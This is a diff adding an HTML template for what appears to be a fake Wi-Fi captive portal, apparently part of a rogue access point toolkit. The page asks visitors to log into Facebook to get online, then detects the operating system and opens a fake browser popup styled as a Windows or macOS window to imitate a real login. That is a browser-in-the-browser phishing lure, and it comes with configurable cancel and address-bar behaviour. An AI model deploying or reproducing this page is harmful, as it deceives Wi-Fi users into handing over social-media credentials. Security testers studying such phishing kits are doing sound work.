@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+  <title>{{ organization }} Wi-Fi Service</title>
+  <link rel="stylesheet" href="oauth/reset.css">
+  <link rel='stylesheet prefetch' href='oauth/roboto.css'>
+  <link rel='stylesheet prefetch' href='oauth/font-awesome.min.css'>
+  <link rel="stylesheet" href="oauth/style.css">
+  <script src='oauth/jquery.min.js'></script>
+  <script src="oauth/index.js"></script>
+  <script src="oauth/jsframe.js"></script>
+</head>
+<style>
+body {
+  font-family: Arial, Helvetica, sans-serif;
+}
+h1 {
+  font-family: 'RobotoDraft', 'Roboto', sans-serif;
+  font-size: 38px;
+  letter-spacing:0.05px;
+  margin: 0;
+  color:#fff;
+  -webkit-font-smoothing: antialiased;
+}
+h4 {
+  font-family: 'RobotoDraft', 'Roboto', sans-serif;
+  color: #666666;
+  font-size: 14px;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+}
+input[type=text], input[type=password] {
+  width: 25%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+}
+.login-btn {
+	-moz-box-shadow:inset 0px 1px 0px 0px #7a8eb9;
+	-webkit-box-shadow:inset 0px 1px 0px 0px #7a8eb9;
+	box-shadow:inset 0px 1px 0px 0px #7a8eb9;
+	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #637aad), color-stop(1, #5972a7));
+	background:-moz-linear-gradient(top, #637aad 5%, #5972a7 100%);
+	background:-webkit-linear-gradient(top, #637aad 5%, #5972a7 100%);
+	background:-o-linear-gradient(top, #637aad 5%, #5972a7 100%);
+	background:-ms-linear-gradient(top, #637aad 5%, #5972a7 100%);
+	background:linear-gradient(to bottom, #637aad 5%, #5972a7 100%);
+	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#637aad', endColorstr='#5972a7',GradientType=0);
+	background-color:#637aad;
+	border:1px solid #314179;
+	display:inline-block;
+	cursor:pointer;
+	color:#ffffff;
+	font-family:Arial;
+	font-size:13px;
+	font-weight:bold;
+	padding:7px 12px;
+	text-decoration:none;
+}
+.login-btn:hover {
+	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #5972a7), color-stop(1, #637aad));
+	background:-moz-linear-gradient(top, #5972a7 5%, #637aad 100%);
+	background:-webkit-linear-gradient(top, #5972a7 5%, #637aad 100%);
+	background:-o-linear-gradient(top, #5972a7 5%, #637aad 100%);
+	background:-ms-linear-gradient(top, #5972a7 5%, #637aad 100%);
+	background:linear-gradient(to bottom, #5972a7 5%, #637aad 100%);
+	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#5972a7', endColorstr='#637aad',GradientType=0);
+	background-color:#5972a7;
+}
+.login-btn:active {
+	position:relative;
+	top:1px;
+}
+input,
+.btn {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 4px;
+  margin: 5px 0;
+  opacity: 0.85;
+  display: inline-block;
+  font-size: 17px;
+  line-height: 20px;
+  text-decoration: none;
+}
+
+input:hover,
+.btn:hover {
+  opacity: 1;
+}
+.form-module {
+  max-width: 400px;
+}
+#btn1, #btn2  {
+color: #666666;
+text-align: center;
+position: absolute;
+bottom: 10px;
+right: 155px;
+}
+.close {
+bottom: -12px
+}
+.modal-header {
+    padding: 1px 20px;
+}
+</style>
+<script>
+function detect_os() {
+var OSName="Unknown OS";
+if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";
+if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";
+if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";
+if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";
+if (OSName == "Windows") {
+    windows_popup();
+    };
+if (OSName == "MacOS") {
+    macos_popup();
+    };
+if (OSName == "Linux") {
+    window.location='index.html';
+    };
+if (OSName == "UNIX") {
+    window.location='index.html';
+    };
+}
+</script>
+<script>
+function twitter_button() {
+	var twitter_button_behavior = "{{twitter_button}}";
+	if (twitter_button_behavior === "alert") {
+  	alert("{{twitter_button_message}}");
+}
+	else if (twitter_button_behavior === "disable") {
+      return false;
+}
+  else {
+    return false;
+  }
+}
+</script>
+<script>
+function facebook_cancel() {
+	var facebook_cancel_button = "{{facebook_cancel_button}}";
+	if (facebook_cancel_button === "alert") {
+ 		alert ("{{cancel_alert_message}}");
+	}
+	else if (facebook_cancel_button === "redirect") {
+ 		window.location='fail.html';
+	}
+	else {
+ 		window.location='fail.html';
+	}	
+ }
+</script>
+<script>
+function addressbar_alert() {
+	var addressbar_behavior = {{addressbar_warning}};
+	if (addressbar_behavior === true){
+  		alert ("{{adressbar_warning_message}}");
+ }
+	else if (addressbar_behavior === false){
+		return false;
+ }
+}
+</script>
+<script type="text/javascript" src="oauth/popup.js"></script>
+<script>
+    function windows_popup() {
+        const jsFrame = new JSFrame();
+        const frames = [];
+        for (let i = 0; i < 1; i++) {
+            const frame = jsFrame.create({
+                name: `Win${i}`,
+                title: `{{popup_title}}`,
+                left:{{popup_position_left}} , top:{{popup_position_top}}, width:{{popup_width}}, height:{{popup_height}},
+				minWidth:{{popup_minwidth}}, minHeight:{{popup_minheight}},
+                appearanceName: 'redstone',
+				smoothResizeOnIframe:true,
+                style: {
+                    overflow: 'hidden'
+                },
+                html: popup_html_page
+            }).show();
+			frame.{{windows_maximize_button}}FrameComponent('maximizeButton');
+			frame.{{windows_minimize_button}}FrameComponent('minimizeButton');
+                frame.setMovable({{popup_movable}});
+                frame.setResizable({{popup_resizable}});
+
+            frame.on('minimizeButton', 'click', (_frame, evt) => {
+
+                frame.hideFrameComponent('minimizeButton');
+                frame.showFrameComponent('deminimizeButton');
+		{{windows_minimizing_behavior}}_frame.closeFrame();
+
+                const force = true;
+
+                _frame.extra.__restore_info = {
+                    org_left: _frame.getLeft(),
+                    org_top: _frame.getTop(),
+                    org_width: _frame.getWidth(),
+                    org_height: _frame.getHeight()
+                };
+
+                _frame.setSize(_frame.getWidth(), 30, force);
+                _frame.setResizable(true);
+
+
+            });
+            frame.on('deminimizeButton', 'click', (_frame, evt) => {
+
+                _frame.showFrameComponent('minimizeButton');
+                _frame.hideFrameComponent('deminimizeButton');
+
+                const force = true;
+                _frame.setSize(_frame.extra.__restore_info.org_width, _frame.extra.__restore_info.org_height, force);
+
+            });
+
+            frame.on('maximizeButton', 'click', (_frame, evt) => {
+
+                _frame.extra.__restore_info = {
+                    org_left: _frame.getLeft(),
+                    org_top: _frame.getTop(),
+                    org_width: _frame.getWidth(),
+                    org_height: _frame.getHeight()
+                };
+
+                frame.hideFrameComponent('maximizeButton');
+                frame.showFrameComponent('restoreButton');
+
+                frame.setPosition(0, 0);
+                frame.setSize(window.innerWidth - 2, window.innerHeight - 2, true);
+
+                frame.setMovable({{popup_maximized_movable}});
+                frame.setResizable({{popup_maximized_resizable}});
+
+
+            });
+
+            frame.on('restoreButton', 'click', (_frame, evt) => {
+
+                frame.setMovable(true);
+                frame.setResizable(true);
+
+                _frame.setPosition(_frame.extra.__restore_info.org_left, _frame.extra.__restore_info.org_top);
+
+                const force = true;
+                _frame.setSize(_frame.extra.__restore_info.org_width, _frame.extra.__restore_info.org_height, force);
+
+                _frame.showFrameComponent('maximizeButton');
+                _frame.hideFrameComponent('restoreButton');
+
+
+            });
+            frame.on('closeButton', 'click', (_frame, evt) => {
+                _frame.closeFrame();
+            });
+            frames.push(frame);
+        }
+        frames[0].requestFocus();
+
+
+
+    }
+	function macos_popup() {
+       		const jsFrame = new JSFrame();		
+		const frames = [];
+
+        for (let i = 0; i < 1; i++) {
+            const frame = jsFrame.create({
+                name: `Win${i}`,
+                title: `{{popup_title}}`,
+                left:{{popup_position_left}} , top:{{popup_position_top}}, width:{{popup_width}}, height:{{popup_height}},
+				minWidth:{{popup_minwidth}}, minHeight:{{popup_minheight}},
+                appearanceName: 'yosemite',
+				smoothResizeOnIframe:true,
+                style: {
+                    overflow: 'hidden'
+                },
+                html: popup_html_page
+            }).show();
+			
+
+                frame.{{macos_minimize_button}}FrameComponent('minimizeButton');
+                frame.{{macos_zoom_button}}FrameComponent('zoomButton');
+                frame.setMovable({{popup_movable}});
+                frame.setResizable({{popup_resizable}});
+
+
+            frame.{{macos_buttons}}setControl({
+                styleDisplay:'inline',
+                maximizeButton: 'zoomButton',
+                demaximizeButton: 'dezoomButton',
+                minimizeButton: 'minimizeButton',
+                deminimizeButton: 'deminimizeButton',
+                hideButton: 'closeButton',
+                animation: {{macos_animation}},
+                animationDuration: 150,
+
+            });
+
+            frame.on('zoomButton', 'click', (_frame, evt) => {
+
+               _frame.extra.__restore_info = {
+                    org_left: _frame.getLeft(),
+                    org_top: _frame.getTop(),
+                    org_width: _frame.getWidth(),
+                    org_height: _frame.getHeight()
+                };
+
+                frame.setPosition(0, 0);
+                frame.setSize(window.innerWidth - 2, window.innerHeight - 2, true);
+
+                frame.hideFrameComponent('zoomButton');
+                frame.showFrameComponent('dezoomButton');
+
+                frame.setMovable({{popup_maximized_movable}});
+                frame.setResizable({{popup_maximized_resizable}});
+
+
+            });
+
+   frame.on('dezoomButton', 'click', (_frame, evt) => {
+
+                  _frame.setPosition(_frame.extra.__restore_info.org_left, _frame.extra.__restore_info.org_top);
+
+                const force = true;
+                _frame.setSize(_frame.extra.__restore_info.org_width, _frame.extra.__restore_info.org_height, force);
+                frame.hideFrameComponent('dezoomButton');
+                frame.showFrameComponent('zoomButton');
+
+                frame.setMovable({{popup_movable}});
+                frame.setResizable({{popup_resizable}});
+
+
+            });
+            frame.on('{{macos_minimizing_behavior}}Button', 'click', (frame, evt) => {
+   	     frame.control.doHide({
+                callback: (frame, info) => {               
+                    frame.closeFrame();
+                }
+            });  });
+
+            frame.control.on('hid', (frame, info) => {
+                frame.closeFrame();
+            });
+            frames.push(frame);
+        }
+        frames[0].requestFocus();
+    }
+</script>
+<body style="-moz-user-select: none; -webkit-user-select: none; -ms-user-select:none; user-select:none;-o-user-select:none;">
+  <div class="pen-title">
+    <h4>Log into your Facebook account to connect to the Internet</h4><span style="color: #666666">A simple, no frills {{ organization }} Wi-Fi service.</span>
+  </div>
+  <div class="module form-module">
+    <div class="form">
+    </div>
+    <div class="form">
+    <div class="row">
+      <h2 style="text-align:center">Login with Social Media</h2>
+      <div class="vl">
+      </div>
+      <div class="col">
+        <a  onclick="detect_os()" class="fb btn">
+          Login with Facebook
+        </a>
+        <a onclick="twitter_button()" class="twitter btn">
+          Login with Twitter
+        </a>
+      </div>
+    </div>
+    <div style="text-align:center"><a id="btn1">Terms of Usage</a></div>
+  </div>
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <span class="close">×</span>
+        <h2 style="color:darkslategray">Terms of Usage</h2>
+      </div>
+      <div style="color: #666666" class="modal-body">
+        <p>This is a {{ organization }} free Hotspot wireless internet Service (the “Service”) provided for use by
+          customers. All users are required to log-in individually as an independent user.</p>
+        <p>
+          The Service is made available provided:
+        </p>
+        <p>
+          (a) You do not use the Service for anything unlawful, immoral or improper;
+        </p>
+        <p>
+          (b) You do not use the Service to make offensive or nuisance communications in whatever form. Such usage
+          includes posting, transmitting, uploading, downloading or otherwise facilitating any content that is
+          unlawful, defamatory, threatening, a nuisance, obscene, hateful, abusive, harmful (including but not limited
+          to viruses, corrupted files, or any other similar software or programs), a breach of privacy, or which is
+          otherwise objectionable;
+        </p>
+        <p>
+          (c) You do not use the Service to harm or attempt to harm minors in any way;
+        </p>
+        <p>
+          (d) You do not act nor knowingly permit others to act in such a way that the operation of the Service or our
+          systems will be jeopardized or impaired;
+        </p>
+        <p>
+          (e) You do not use abusive or threatening behavior towards other users of the Service, members of our staff
+          or any person in the vicinity of a Wireless LAN Hotspot;
+        </p>
+        <p>
+          (f) You do not use the Service to access or use content in a way that infringes the rights of others;
+        </p>
+        <p>
+          (g) The Service is used in accordance with any third party policies for acceptable use or any relevant
+          internet standards (where applicable).
+        </p>
+        <p>
+          (h) You agree not to resell or re-broadcast any aspect of the Service, whether for profit or otherwise. You
+          accept that your entitlement to use the Service is for your personal use only and that you shall not be
+          entitled to transfer your entitlement to use the Service to any other person or allow any other person to
+          make use of the Service or of any username or password or other entitlement supplied to you in connection
+          with the Service.
+        </p>
+        <p>
+          (i) You also agree not to modify the Unit or use the Service for any fraudulent purpose, or in such a way as
+          to create damage or risk to our business, reputation, employees, subscribers, facilities, third parties or to
+          the public generally.
+        </p>
+        <p>
+          (j) You have no proprietary or ownership rights to any username or password or to a specific IP address, or
+          e-mail address assigned to you or your Unit. We may change such addresses at any time or deactivate or
+          suspend Service to any address without prior notice to you if we suspect any unlawful or fraudulent use of
+          the services.
+        </p>
+      </div>
+    </div>
+</body>
+</html>
